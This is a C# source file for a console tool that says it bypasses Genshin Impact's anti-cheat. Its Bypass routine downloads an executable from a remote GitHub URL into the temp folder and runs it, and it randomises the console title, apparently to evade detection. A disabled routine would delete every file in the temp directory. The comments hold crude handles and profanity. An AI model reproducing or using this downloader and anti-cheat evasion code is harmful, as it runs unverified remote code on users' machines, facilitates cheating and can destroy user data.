using System;
using System.CodeDom.Compiler;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;

namespace GenshinPublic
{
    public class Program
    {
        static void Bypass()
        {
            bool Program = false;
            try
            {
                //credit to DesirePro(FUCK#9803)
                WebClient webClient = new WebClient();
                webClient.DownloadFile(new Uri("https://github.com/DeftSolutions-dev/HackGenshin/raw/main/FuckYou/ggAC.exe"), Path.Combine(Path.GetTempPath(), "Bypass.exe"));
                if (File.Exists(Path.Combine(Path.GetTempPath(), "Bypass.exe")) && new FileInfo(Path.Combine(Path.GetTempPath(), "Bypass.exe")).Length > 10L)
                {
                    Program = true;
                }
                else
                {
                    Console.WriteLine("Could Not Download File, check your Anti Virus!");
                    Console.ReadKey();
                }
                if (Program)
                {
                    Process.Start(Path.Combine(Path.GetTempPath(), "Bypass.exe"));
                }
            }
            catch (WebException)
            {
                Console.WriteLine("Please Check Your Internet Connection");
                Console.ReadKey();
            }
            catch (Exception arg)
            {
                Console.WriteLine("Error! " + arg);
            }
        }
        private static void RandomName()
        {
            Console.Title = "";
            Random rnd = new Random();
            Char[] pwdChars = new Char[36] { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
            for (int i = 35; i < 75; i++)
                Console.Title += pwdChars[rnd.Next(0, 35)];
            Thread.Sleep(10);
        }
        const string Chars = "awdauUWHU2Dw722322tyuawDawwGG3hwd";
        static string RandomString(int length)
        {
            Random random = new Random();
            return new string(Enumerable.Repeat(Chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }
        [STAThread]
        [DebuggerNonUserCode]
        [GeneratedCode("PresentationBuildTasks", "1.0.0.0")]
        public static void Main(string[] args)
        {
            RandomName();
            if (Process.GetProcessesByName("GenshinImpact").Length != 0)
            {
                Bypass();
                Console.WriteLine("Bypassing Genshin Anti Cheat...");
                Console.WriteLine("Closing Mhyprot2... Wait....");
                Console.Clear();
                Console.WriteLine("Bypassed");
                Console.WriteLine();
                Console.WriteLine("credit to DesirePro(FUCK#9803)");
                Console.WriteLine("Made By Dwaine#0572");
                Console.ReadLine();
                LoadFile();
                return;
            }

            if (Process.GetProcessesByName("GenshinImpact").Length == 0)
            {
                int smollpp = 0;
                while (smollpp < 5)
                {
                    RandomName();
                    smollpp++;
                }
                using (Process process = Process.Start("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Genshin Impact\\Genshin Impact.lnk"))
                {
                    process.WaitForInputIdle();
                    Console.WriteLine("PID Launcher.exe : " + process.Id);
                    Process[] p = Process.GetProcessesByName("GenshinImpact");
                    Console.WriteLine("PID Genshin Impact.exe : " + p);
                }
            }

            RandomName();
            Console.WriteLine("Cannot Bypass...");
            Console.WriteLine("Open Genshin Impact");
            Console.Beep();
            Console.WriteLine("Load Into The Game Completely");
            Console.WriteLine("Reopen This Bypasser");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("credit to DesirePro(FUCK#9803)");
            Console.WriteLine("Made By Dwaine#0572");
            Console.WriteLine();
            Thread.Sleep(10000);
            Console.Clear();
            for (int i = 0; i < 15; i++)
            {
                string bigpp = "Closing The Program Now";
                string smolp = "Reopen This Bypasser After You Completely Enterd World";
                Console.WriteLine(bigpp + smolp);
                Console.WriteLine("Loading...");
            }
            Thread.Sleep(2000);
            Environment.Exit(0);
            Console.ReadKey();
        }

        private static void LoadFile()
        {
            bool DelProg = false;
            if (DelProg)
            {
                try
                {
                    File.Delete(Path.Combine(Path.GetTempPath(), "Bypass.exe"));
                    var tmpPath = Path.GetTempPath();
                    var files = Directory.GetFiles(tmpPath, "*.*", SearchOption.AllDirectories);
                    foreach (var file in files)
                    {
                        if (File.Exists(file))
                        {
                            File.Delete(file);
                        }
                    }
                }
                catch
                {
                    Process.Start("Clear_Temp.bat");
                }
            }
        }
        //credit to DesirePro(FUCK#9803)
    }
}
